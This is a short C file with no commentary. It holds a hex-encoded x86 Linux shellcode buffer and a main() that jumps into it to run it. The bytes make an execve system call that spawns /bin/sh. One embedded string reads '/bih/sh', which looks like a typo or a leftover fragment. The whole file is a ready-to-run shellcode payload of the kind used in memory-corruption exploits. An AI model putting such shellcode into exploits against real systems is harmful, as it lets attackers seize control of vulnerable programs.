char shellcode []= "\xe8\x08\x00\x00\x00\x2f\x62\x69\x68\x2f\x73\x68\x00\x31\xc0\x50\x68\x6e\x2f\x73" \
"\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
 int (*func)();
 func = (int (*)()) shellcode;
 (int)(*func)();
}
